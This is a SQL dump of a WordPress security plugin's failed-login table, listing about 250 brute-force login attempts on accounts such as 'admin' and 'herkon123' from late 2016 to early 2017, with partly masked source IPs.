INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("69","1","herkon123","2016-12-16 05:00:55","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("70","1","herkon123","2016-12-16 05:01:02","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("71","5","demouser","2016-12-16 05:01:03","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("72","1","herkon123","2016-12-16 05:06:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("73","1","herkon123","2016-12-16 05:06:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("74","1","herkon123","2016-12-16 05:11:28","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("75","5","demouser","2016-12-16 05:11:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("76","5","demouser","2016-12-16 05:11:32","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("77","1","herkon123","2016-12-16 05:16:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("78","5","demouser","2016-12-16 05:16:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("79","5","demouser","2016-12-16 05:16:44","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("80","5","demouser","2016-12-16 05:21:35","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("81","1","herkon123","2016-12-16 05:26:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("82","5","demouser","2016-12-16 05:26:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("83","5","demouser","2016-12-16 05:26:41","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("84","1","herkon123","2016-12-16 05:26:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("85","5","demouser","2016-12-16 05:31:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("86","1","herkon123","2016-12-16 05:31:59","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("87","5","demouser","2016-12-16 05:32:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("88","1","herkon123","2016-12-16 05:32:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("89","5","demouser","2016-12-16 05:36:40","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("90","1","herkon123","2016-12-16 05:36:40","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("91","5","demouser","2016-12-16 05:36:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("92","1","herkon123","2016-12-16 05:36:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("93","5","demouser","2016-12-16 05:41:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("94","1","herkon123","2016-12-16 05:41:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("95","1","herkon123","2016-12-16 05:42:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("96","5","demouser","2016-12-16 05:42:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("97","1","herkon123","2016-12-16 05:47:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("98","5","demouser","2016-12-16 05:47:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("99","5","demouser","2016-12-16 05:47:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("100","1","herkon123","2016-12-16 05:47:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("101","5","demouser","2016-12-16 05:52:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("102","1","herkon123","2016-12-16 05:52:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("103","5","demouser","2016-12-16 05:52:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("104","1","herkon123","2016-12-16 05:52:40","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("105","5","demouser","2016-12-16 05:57:12","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("106","1","herkon123","2016-12-16 05:57:13","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("107","1","herkon123","2016-12-16 05:57:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("108","5","demouser","2016-12-16 05:57:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("109","5","demouser","2016-12-16 06:02:10","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("110","1","herkon123","2016-12-16 06:02:10","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("111","5","demouser","2016-12-16 06:02:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("112","1","herkon123","2016-12-16 06:07:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("113","5","demouser","2016-12-16 06:07:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("114","1","herkon123","2016-12-16 06:07:10","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("115","5","demouser","2016-12-16 06:07:11","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("116","1","herkon123","2016-12-16 06:12:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("117","5","demouser","2016-12-16 06:12:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("118","1","herkon123","2016-12-16 06:12:28","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("119","5","demouser","2016-12-16 06:12:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("120","1","herkon123","2016-12-16 06:21:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("121","5","demouser","2016-12-16 06:21:59","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("122","5","demouser","2016-12-16 06:22:04","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("123","1","herkon123","2016-12-16 06:22:07","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("124","5","demouser","2016-12-16 06:26:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("125","5","demouser","2016-12-16 06:26:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("126","1","herkon123","2016-12-16 06:31:24","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("127","5","demouser","2016-12-16 06:31:26","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("128","1","herkon123","2016-12-16 06:31:30","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("129","5","demouser","2016-12-16 06:31:33","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("130","1","herkon123","2016-12-16 06:36:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("131","1","herkon123","2016-12-16 06:36:02","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("132","1","herkon123","2016-12-16 06:40:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("133","5","demouser","2016-12-16 06:40:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("134","1","herkon123","2016-12-16 06:40:44","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("135","5","demouser","2016-12-16 06:45:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("136","5","demouser","2016-12-16 06:45:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("137","1","herkon123","2016-12-16 06:50:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("138","5","demouser","2016-12-16 06:50:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("139","5","demouser","2016-12-16 06:50:13","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("140","1","herkon123","2016-12-16 06:50:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("141","5","demouser","2016-12-16 06:54:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("142","1","herkon123","2016-12-16 06:54:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("143","5","demouser","2016-12-16 06:54:52","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("144","1","herkon123","2016-12-16 06:54:54","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("145","5","demouser","2016-12-16 07:04:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("146","1","herkon123","2016-12-16 07:04:40","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("147","1","herkon123","2016-12-16 07:04:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("148","5","demouser","2016-12-16 07:04:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("149","1","herkon123","2016-12-16 07:09:43","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("150","5","demouser","2016-12-16 07:09:43","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("151","1","herkon123","2016-12-16 07:09:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("152","5","demouser","2016-12-16 07:09:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("153","5","demouser","2016-12-16 07:14:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("154","1","herkon123","2016-12-16 07:14:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("155","1","herkon123","2016-12-16 07:14:55","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("156","1","herkon123","2016-12-16 07:20:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("157","5","demouser","2016-12-16 07:20:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("158","1","herkon123","2016-12-16 07:20:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("159","5","demouser","2016-12-16 07:20:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("160","5","demouser","2016-12-16 07:25:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("161","1","herkon123","2016-12-16 07:25:41","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("162","5","demouser","2016-12-16 07:25:45","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("163","1","herkon123","2016-12-16 07:31:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("164","5","demouser","2016-12-16 07:31:19","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("165","1","herkon123","2016-12-16 07:31:23","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("166","5","demouser","2016-12-16 07:31:24","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("167","5","demouser","2016-12-16 07:36:55","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("168","1","herkon123","2016-12-16 07:36:55","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("169","5","demouser","2016-12-16 07:36:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("170","1","herkon123","2016-12-16 07:36:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("171","5","demouser","2016-12-16 07:47:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("172","1","herkon123","2016-12-16 07:47:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("173","5","demouser","2016-12-16 07:47:43","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("174","5","demouser","2016-12-16 07:53:03","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("175","1","herkon123","2016-12-16 07:53:03","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("176","5","demouser","2016-12-16 07:53:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("177","5","demouser","2016-12-16 07:58:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("178","0","herkonyapi.com","2016-12-16 08:03:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("179","0","herkonyapi.com","2016-12-16 08:03:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("180","0","herkonyapi.com","2016-12-16 08:06:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("181","0","herkonyapi.com","2016-12-16 08:06:50","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("182","0","herkonyapi.com","2016-12-16 08:06:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("183","0","herkonyapi.com","2016-12-16 08:06:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("184","0","herkonyapi.com","2016-12-16 08:12:13","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("185","0","herkonyapi.com","2016-12-16 08:12:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("186","0","herkonyapi.com","2016-12-16 08:14:34","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("187","0","herkonyapi.com","2016-12-16 08:14:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("188","0","herkonyapi.com","2016-12-16 08:16:59","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("189","0","herkonyapi.com","2016-12-16 08:19:35","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("190","0","herkonyapi.com","2016-12-16 08:19:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("191","0","herkonyapi.com","2016-12-16 08:31:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("192","0","herkonyapi.com","2016-12-16 08:34:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("193","0","herkonyapi.com","2016-12-16 08:34:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("194","0","herkonyapi.com","2016-12-16 08:37:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("195","0","herkonyapi.com","2016-12-16 08:42:23","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("196","0","herkonyapi.com","2016-12-16 08:42:32","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("197","0","herkonyapi.com","2016-12-16 08:44:59","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("198","0","herkonyapi.com","2016-12-16 08:47:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("199","0","herkonyapi.com","2016-12-16 08:47:34","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("200","0","herkonyapi.com","2016-12-16 08:50:05","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("201","0","herkonyapi.com","2016-12-16 08:50:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("202","0","herkonyapi.com","2016-12-16 08:52:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("203","0","herkonyapi.com","2016-12-16 08:52:54","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("204","0","herkonyapi.com","2016-12-16 08:58:16","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("205","0","herkonyapi.com","2016-12-16 09:00:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("206","0","herkonyapi.com","2016-12-16 09:00:56","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("207","0","herkonyapi.com","2016-12-16 09:05:37","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("208","0","herkonyapi.com","2016-12-16 09:05:41","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("209","0","herkonyapi.com","2016-12-16 09:08:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("210","0","herkonyapi.com","2016-12-16 09:08:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("211","0","herkonyapi.com","2016-12-16 09:11:07","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("212","0","herkonyapi.com","2016-12-16 09:13:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("213","0","herkonyapi.com","2016-12-16 09:14:01","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("214","0","herkonyapi.com","2016-12-16 09:19:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("215","1","herkon123","2016-12-18 04:09:51","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("216","1","herkon123","2016-12-18 04:09:52","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("217","0","admin","2016-12-19 08:47:49","199.193.253.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("218","0","admin","2016-12-19 13:38:31","192.157.245.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("219","0","admin","2016-12-19 18:31:24","199.193.252.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("220","0","admin","2016-12-19 23:10:13","198.23.231.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("221","0","admin","2016-12-20 04:24:43","199.193.251.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("222","0","admin","2016-12-20 09:07:53","192.227.204.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("223","0","admin","2016-12-20 13:49:58","172.246.118.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("224","0","admin","2016-12-20 18:34:16","192.157.252.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("225","1","herkon123","2016-12-21 18:01:54","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("226","1","herkon123","2016-12-21 18:01:56","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("227","1","herkon123","2016-12-25 11:34:37","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("228","1","herkon123","2016-12-25 11:34:38","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("229","1","herkon123","2016-12-29 06:45:27","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("230","1","herkon123","2016-12-29 06:45:31","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("231","1","herkon123","2016-12-30 02:46:24","124.197.128.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("232","1","herkon123","2017-01-01 18:08:14","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("233","1","herkon123","2017-01-01 18:08:15","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("234","1","herkon123","2017-01-03 23:25:04","206.214.6.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("235","1","herkon123","2017-01-05 09:45:53","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("236","1","herkon123","2017-01-05 09:45:56","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("237","1","herkon123","2017-01-06 18:59:09","24.232.202.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("238","1","herkon123","2017-01-07 00:58:58","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("239","1","herkon123","2017-01-07 00:59:01","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("240","0","admin","2017-01-08 04:15:31","5.39.222.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("241","1","herkon123","2017-01-08 10:46:30","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("242","1","herkon123","2017-01-08 10:46:34","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("243","0","admin","2017-01-08 13:55:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("244","0","admin","2017-01-08 13:55:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("245","0","admin","2017-01-08 13:57:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("246","0","admin","2017-01-08 13:57:36","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("247","0","admin","2017-01-08 14:03:10","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("248","0","admin","2017-01-08 14:03:13","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("249","0","admin","2017-01-08 14:09:17","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("250","0","admin","2017-01-08 14:09:20","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("251","0","admin","2017-01-08 14:12:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("252","0","admin","2017-01-08 14:12:13","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("253","0","admin","2017-01-08 14:15:02","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("254","0","admin","2017-01-08 14:17:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("255","0","admin","2017-01-08 14:20:25","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("256","0","admin","2017-01-08 14:23:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("257","0","admin","2017-01-08 14:29:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("258","0","admin","2017-01-08 14:29:51","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("259","0","admin","2017-01-08 14:36:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("260","0","admin","2017-01-08 14:36:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("261","0","admin","2017-01-08 14:38:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("262","0","admin","2017-01-08 14:41:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("263","0","admin","2017-01-08 14:41:48","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("264","0","admin","2017-01-08 14:48:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("265","0","admin","2017-01-08 14:48:37","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("266","0","admin","2017-01-08 14:54:47","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("267","0","admin","2017-01-08 14:54:51","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("268","0","admin","2017-01-08 14:58:14","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("269","0","admin","2017-01-08 14:58:17","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("270","0","admin","2017-01-08 15:01:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("271","0","admin","2017-01-08 15:01:27","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("272","0","admin","2017-01-08 15:04:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("273","0","admin","2017-01-08 15:04:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("274","0","admin","2017-01-08 15:10:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("275","0","admin","2017-01-08 15:10:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("276","0","admin","2017-01-08 15:15:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("277","0","admin","2017-01-08 15:15:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("278","0","admin","2017-01-08 15:20:29","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("279","0","admin","2017-01-08 15:20:30","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("280","0","admin","2017-01-08 15:25:31","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("281","0","admin","2017-01-08 15:25:32","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("282","0","admin","2017-01-08 15:30:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("283","0","admin","2017-01-08 15:30:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("284","0","admin","2017-01-08 15:35:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("285","0","admin","2017-01-08 15:35:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("286","0","admin","2017-01-08 15:41:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("287","0","admin","2017-01-08 15:41:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("288","0","admin","2017-01-08 15:46:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("289","0","admin","2017-01-08 15:46:12","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("290","0","admin","2017-01-08 15:51:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("291","0","admin","2017-01-08 15:51:16","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("292","0","admin","2017-01-08 15:56:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("293","0","admin","2017-01-08 15:56:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("294","0","admin","2017-01-08 16:01:33","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("295","0","admin","2017-01-08 16:01:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("296","0","admin","2017-01-08 16:06:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("297","0","admin","2017-01-08 16:06:42","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("298","0","admin","2017-01-08 16:11:43","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("299","0","admin","2017-01-08 16:11:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("300","0","admin","2017-01-08 16:16:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("301","0","admin","2017-01-08 16:16:51","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("302","0","admin","2017-01-08 16:21:52","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("303","0","admin","2017-01-08 16:21:53","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("304","0","admin","2017-01-08 16:27:00","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("305","0","admin","2017-01-08 16:27:01","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("306","0","admin","2017-01-08 16:32:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("307","0","admin","2017-01-08 16:32:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("308","0","admin","2017-01-08 16:37:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("309","0","admin","2017-01-08 16:37:20","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("310","0","admin","2017-01-08 16:42:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("311","0","admin","2017-01-08 16:42:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("312","0","admin","2017-01-08 16:47:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("313","0","admin","2017-01-08 16:47:43","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("314","0","admin","2017-01-09 00:28:57","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("315","0","admin","2017-01-09 00:28:59","91.210.147.*");
